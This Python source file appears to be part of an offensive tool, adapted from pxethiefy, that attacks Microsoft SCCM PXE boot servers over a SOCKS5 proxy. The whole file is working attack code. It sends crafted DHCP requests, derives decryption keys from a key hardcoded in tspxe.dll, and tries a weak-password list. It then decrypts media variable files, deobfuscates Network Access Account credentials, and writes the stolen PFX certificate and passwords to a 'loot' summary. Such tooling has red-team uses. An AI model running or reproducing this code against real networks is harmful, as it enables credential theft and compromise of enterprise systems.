import struct
import socket
import time
import os
import xml.etree.ElementTree as ET
from hashlib import sha1
import binascii
from Crypto.Cipher import AES, DES3

## Most of the code here is taken from pxethiefy.py (we're just wrapping in SOCKS5), with thanks to the author!
## https://github.com/csandker/pxethiefy/blob/main/pxethiefy.py

# Blank/default PXE media passwords worth trying before falling back to offline
# hash cracking. Ported from evildaemond/pxethiefup's test_default_weak_passwords_on_media.
WEAK_PASSWORDS = [
    "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}",
    "1234", "123456", "12345678", "123456789",
    "password", "password1", "password123",
    "admin", "administrator", "root", "letmein",
    "qwerty", "abc123", "welcome", "Welcome1",
    "P@ssw0rd", "P@ssword", "P@ssw0rd1", "P@ssword1",
]

class SCCM:
    def __init__(self, target, port, socks_client):
        self.target = target
        self.port = port
        self.socks_client = socks_client

    def _craft_packet(self, client_ip, client_mac):
        from scapy.layers.dhcp import BOOTP, DHCP

        pkt = BOOTP(ciaddr=client_ip,chaddr=client_mac)/DHCP(options=[
            ("message-type","request"),
            ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
            ('pxe_client_architecture', b'\x00\x00'), #x86 architecture
            (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
            #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
            ('vendor_class_id', b'PXEClient'),
            ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
            "end"])

        return pkt

    def _extract_boot_files(self, variables_file, dhcp_options):
        bcd_file, encrypted_key = (None, None)
        if variables_file:
            packet_type = variables_file[0] #First byte of the option data determines the type of data that follows
            data_length = variables_file[1] #Second byte of the option data is the length of data that follows

            #If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
            if packet_type == 1:
                #Skip first two bytes of option and copy the file name by data_length
                variables_file = variables_file[2:2+data_length]
                variables_file = variables_file.decode('utf-8')
            #If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
            elif packet_type == 2:
                #Skip first two bytes of option and copy the encrypted data by data_length
                encrypted_key = variables_file[2:2+data_length]

                #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2

                #Read out string length
                string_length = variables_file[string_length_index]

                #Read out variables.dat file name and decode to utf-8 string
                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
                variables_file = variables_file.decode('utf-8')
            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
        else:
            print("[!] No variable file location (DHCP option 243) found in the received packet")

        return [variables_file,bcd_file,encrypted_key]

    def read_media_variable_file(self, filedata):
        return filedata[24:-8]

    def aes128_decrypt(self,data,key):
        aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
        decrypted = aes128.decrypt(data)
        return decrypted.decode("utf-16-le")

    def aes128_decrypt_raw(self,data,key):
        aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
        decrypted = aes128.decrypt(data)
        return decrypted

    def aes_des_key_derivation(self,password):
        key_sha1 = sha1(password).digest()
        b0 = b""
        for x in key_sha1:
            b0 += bytes((x ^ 0x36,))

        b1 = b""
        for x in key_sha1:
            b1 += bytes((x ^ 0x5c,))
        # pad remaining bytes with the appropriate value
        b0 += b"\x36"*(64 - len(b0))
        b1 += b"\x5c"*(64 - len(b1))
        b0_sha1 = sha1(b0).digest()
        b1_sha1 = sha1(b1).digest()
        return b0_sha1 + b1_sha1

    def derive_blank_decryption_key(self,encrypted_key):
        length = encrypted_key[0]
        encrypted_bytes = encrypted_key[1:1+length] # pull out bytes that relate to the encrypted bytes in the DHCP response

        # Detect inner encryption algorithm from ALG_ID at offset 12 (little-endian u32)
        # CALG_3DES = 0x6603, CALG_AES_128 = 0x660e, CALG_AES_256 = 0x6610
        inner_alg_id = struct.unpack_from("<I", encrypted_bytes, 12)[0]

        encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
        key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll
        key = self.aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response

        if inner_alg_id == 0x6610:
            # AES-256 inner encryption — use 32-byte key
            aes = AES.new(key[:32], AES.MODE_CBC, b"\x00"*16)
            var_file_key = aes.decrypt(encrypted_bytes[:16])[:10]
        elif inner_alg_id == 0x6603:
            # CALG_3DES inner encryption — legacy sites. Ported from blurbdust/PXEThief;
            # unverified against a live 3DES-wrapped cryptokey capture.
            var_file_key = self._3des_decrypt(encrypted_bytes[:24], key[:24])[:10]
        else:
            # AES-128 inner encryption (default/original behavior)
            var_file_key = self.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]

        LEADING_BIT_MASK =  b'\x80'
        new_key = bytearray()
        for byte in struct.unpack('10c',var_file_key):
            if (LEADING_BIT_MASK[0] & byte[0]) == 128:
                new_key = new_key + byte + b'\xFF'
            else:
                new_key = new_key + byte + b'\x00'

        return new_key

    def send_bootp_request(self, client_ip, client_mac):
        from scapy.layers.dhcp import BOOTP, DHCP

        self.socks_client.send(bytes(self._craft_packet(client_ip, client_mac)), (self.target, self.port))
        data = self.socks_client.recv(9076)

        # Load the packet
        bootp_layer = BOOTP(data)

        dhcp_layer = bootp_layer[DHCP]
        dhcp_options = dhcp_layer[DHCP].options

        opt243 = next((opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243), None)
        if opt243 is None or not opt243[1]:
            raise RuntimeError("No variable file location (DHCP option 243) in PXE server response")

        variables_file = opt243[1]
        variables_file, bcd_file, encrypted_key = self._extract_boot_files(variables_file, dhcp_options)

        if not variables_file or not isinstance(variables_file, str):
            raise RuntimeError("Failed to extract variable file path from DHCP response")

        return [variables_file, bcd_file, encrypted_key]

    def read_media_variable_file_header(self, filedata):
        return filedata[:40]

    def detect_encryption_type(self, filedata):
        """Detect AES-128 or AES-256 from the ALG_ID in the file header.
        ALG_ID is at bytes 16-20 of the 40-byte header (little-endian u32).
        CALG_AES_128 = 0x0000660e
        CALG_AES_256 = 0x00006610
        """
        header = filedata[:40]
        alg_id = struct.unpack_from("<I", header, 16)[0]
        if alg_id == 0x660e:
            return 128
        elif alg_id == 0x6610:
            return 256
        else:
            return None

    def decrypt_media_file(self, filedata, password):
        """Decrypt media variable file given raw file data and password/key bytes.
        password: bytes from derive_blank_decryption_key or from a cracked hash.
        Auto-detects AES-128 vs AES-256 from the file header.
        """
        aes_bits = self.detect_encryption_type(filedata)
        if aes_bits is None:
            raise ValueError("Unknown encryption algorithm in file header")

        key_material = self.aes_des_key_derivation(password)
        # AES-128: first 16 bytes, AES-256: first 32 bytes (20 from ipad + 12 from opad)
        if aes_bits == 128:
            aes_key = key_material[:16]
        else:
            aes_key = key_material[:32]

        encrypted_data = self.read_media_variable_file(filedata)
        # Truncate to 16-byte boundary for AES CBC
        last_16 = (len(encrypted_data) // 16) * 16
        aes = AES.new(aes_key, AES.MODE_CBC, b"\x00"*16)
        decrypted_raw = aes.decrypt(encrypted_data[:last_16])
        try:
            decrypted = decrypted_raw.decode("utf-16-le")
        except UnicodeDecodeError:
            raise ValueError("Decryption produced invalid data — key is likely wrong")
        # Strip trailing nulls and non-printable chars
        decrypted = decrypted[:decrypted.rfind('\x00')] if '\x00' in decrypted else decrypted
        return "".join(c for c in decrypted if c.isprintable())

    def try_weak_passwords(self, filedata):
        """Try the blank/default PXE media password plus a short list of common
        weak passwords against a media file before falling back to offline hash
        cracking. Ported from evildaemond/pxethiefup's test_default_weak_passwords_on_media.
        Returns (password, decrypted_xml) on success, else (None, None).
        """
        for password in WEAK_PASSWORDS:
            try:
                decrypted = self.decrypt_media_file(filedata, password.encode("utf-16-le"))
            except Exception:
                continue
            if "_SMSTSMediaPFX" in decrypted or "<var " in decrypted:
                return password, decrypted
        return None, None

    def _3des_decrypt(self, data, key):
        des3 = DES3.new(key, DES3.MODE_CBC, b"\x00" * 8)
        return des3.decrypt(data)

    def _aes_decrypt_raw(self, data, key):
        aes = AES.new(key, AES.MODE_CBC, b"\x00" * 16)
        return aes.decrypt(data)

    def deobfuscate_credential_string(self, credential_string):
        """Deobfuscate SCCM secret="1" credential strings (NAA, collection vars, etc).
        Supports CALG_3DES (0x6603), CALG_AES_128 (0x660E), CALG_AES_192 (0x660F),
        CALG_AES_256 (0x6610).
        """
        hex_string = "".join(ch for ch in credential_string if ch in "0123456789abcdefABCDEF")

        key_data = binascii.unhexlify(hex_string[8:88])
        encrypted_data = binascii.unhexlify(hex_string[128:])
        key = self.aes_des_key_derivation(key_data)

        alg_id = int.from_bytes(binascii.unhexlify(hex_string[112:120]), "little")

        if alg_id == 0x6603:
            last = (len(encrypted_data) // 8) * 8
            decrypted = self._3des_decrypt(encrypted_data[:last], key[:24])
        elif alg_id in (0x660E, 0x660F, 0x6610):
            key_lengths = {0x660E: 16, 0x660F: 24, 0x6610: 32}
            last = (len(encrypted_data) // 16) * 16
            decrypted = self._aes_decrypt_raw(encrypted_data[:last], key[:key_lengths[alg_id]])
        else:
            raise ValueError(f"Unsupported ALG_ID: 0x{alg_id:04x}")

        text = decrypted.decode("utf-16-le")
        return text[:text.rfind('\x00')] if '\x00' in text else text

    def deobfuscate_naa_xml(self, xml_text):
        """Parse NAAConfig XML and deobfuscate all credential strings."""
        root = ET.fromstring(xml_text)
        results = []
        for instance in root.iter("instance"):
            if "CCM_NetworkAccessAccount" not in instance.get("class", ""):
                continue
            username_el = instance.find(".//*[@name='NetworkAccessUsername']/value")
            password_el = instance.find(".//*[@name='NetworkAccessPassword']/value")
            username = self.deobfuscate_credential_string(username_el.text) if username_el is not None and username_el.text else None
            password = self.deobfuscate_credential_string(password_el.text) if password_el is not None and password_el.text else None
            results.append((username, password))
        return results

    def extract_media_variables(self, xml_text, output_dir):
        """Parse decrypted media variables XML and extract PFX cert and key info.
        Writes files to output_dir and returns a dict of extracted values.
        """
        os.makedirs(output_dir, exist_ok=True)

        root = ET.fromstring(xml_text.encode("utf-16-le"))

        result = {}

        # Extract all variables for reference
        for var in root.findall('.//var'):
            name = var.get('name', '')
            result[name] = var.text or ''

        # Write full XML
        xml_path = os.path.join(output_dir, "variables.xml")
        with open(xml_path, "w") as f:
            f.write(xml_text)
        print(f"[*] Wrote decrypted variables to {xml_path}")

        # Extract key values
        site_code = result.get('_SMSTSSiteCode', '')
        media_guid = result.get('_SMSMediaGuid', '')
        mp_url = result.get('SMSTSMP', '')
        pfx_hex = result.get('_SMSTSMediaPFX', '')

        print(f"[*] Management Point: {mp_url}")
        print(f"[*] Site Code: {site_code}")
        print(f"[*] Media GUID: {media_guid}")

        # PFX password is first 31 chars of the media GUID
        pfx_password = media_guid[:31]

        if pfx_hex:
            pfx_bytes = bytes.fromhex(pfx_hex)
            pfx_filename = f"{site_code}_SMSTSMediaPFX.pfx"
            pfx_path = os.path.join(output_dir, pfx_filename)
            with open(pfx_path, "wb") as f:
                f.write(pfx_bytes)
            print(f"[*] Wrote PFX certificate ({len(pfx_bytes)} bytes) to {pfx_path}")
            print(f"[*] PFX password: {pfx_password}")

        # Write a summary file with all the info needed for next steps
        summary_path = os.path.join(output_dir, "loot_summary.txt")
        with open(summary_path, "w") as f:
            f.write(f"Management Point: {mp_url}\n")
            f.write(f"Site Code: {site_code}\n")
            f.write(f"Media GUID: {media_guid}\n")
            f.write(f"PFX Password: {pfx_password}\n")
            f.write(f"PFX File: {pfx_filename if pfx_hex else 'N/A'}\n")
            f.write(f"\nAll Variables:\n")
            for name, value in result.items():
                if name == '_SMSTSMediaPFX':
                    f.write(f"  {name} = [{len(value)} hex chars]\n")
                else:
                    f.write(f"  {name} = {value}\n")
        print(f"[*] Wrote loot summary to {summary_path}")

        return result
